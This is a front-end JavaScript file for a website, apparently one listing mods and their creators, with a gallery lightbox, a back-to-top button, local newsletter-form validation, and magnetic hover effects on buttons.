// ======================== GALLERY LIGHTBOX ========================
const lightbox = document.getElementById('lightbox');
const lightboxImg = document.getElementById('lightboxImg');
const lightboxClose = lightbox ? lightbox.querySelector('.lightbox-close') : null;

function openLightbox(src) {
    if (!lightbox || !lightboxImg) return;
    lightboxImg.src = src;
    lightbox.classList.add('show');
    lightbox.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
}

function closeLightbox() {
    if (!lightbox) return;
    lightbox.classList.remove('show');
    lightbox.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
}

if (lightboxClose) lightboxClose.addEventListener('click', closeLightbox);
if (lightbox) {
    lightbox.addEventListener('click', (e) => {
        if (e.target === lightbox) closeLightbox();
    });
}

document.querySelectorAll('.gallery-item').forEach(item => {
    item.addEventListener('click', () => {
        const src = item.dataset.img || item.querySelector('img')?.src;
        if (src) openLightbox(src);
    });
});

// ======================== BACK TO TOP ========================
const backToTop = document.getElementById('backToTop');
if (backToTop) {
    const checkBack = () => {
        if (window.scrollY > 600) backToTop.classList.add('visible');
        else backToTop.classList.remove('visible');
    };
    window.addEventListener('scroll', checkBack, { passive: true });
    backToTop.addEventListener('click', () => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    });
    checkBack();
}

// ======================== NEWSLETTER ========================
const newsletterForm = document.getElementById('newsletterForm');
const newsletterEmail = document.getElementById('newsletterEmail');
if (newsletterForm && newsletterEmail) {
    newsletterForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const email = newsletterEmail.value.trim();
        const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        if (!valid) {
            newsletterEmail.classList.add('error');
            toast('Please enter a valid email address', 'error', 'fa-circle-exclamation');
            setTimeout(() => newsletterEmail.classList.remove('error'), 1200);
            return;
        }
        try { localStorage.setItem(newsletterKey, email); } catch { }
        toast(`Subscribed as ${email}`, 'success', 'fa-circle-check');
        newsletterEmail.value = '';
    });
    // pre-fill if already subscribed
    try {
        const saved = localStorage.getItem(newsletterKey);
        if (saved) newsletterEmail.placeholder = `${saved} (subscribed)`;
    } catch { }
}



// ======================== MAGNETIC BUTTONS ========================
document.querySelectorAll('.magnetic').forEach(btn => {
    btn.addEventListener('mousemove', (e) => {
        if (isTouchDevice()) return;
        const rect = btn.getBoundingClientRect();
        const x = e.clientX - rect.left - rect.width / 2;
        const y = e.clientY - rect.top - rect.height / 2;
        btn.style.transform = `translate(${x * 0.12}px, ${y * 0.15}px)`;
    });
    btn.addEventListener('mouseleave', () => {
        btn.style.transform = '';
    });
});

// ======================== INIT ========================
document.addEventListener('DOMContentLoaded', () => {
    renderMods();
    renderCreators();
});
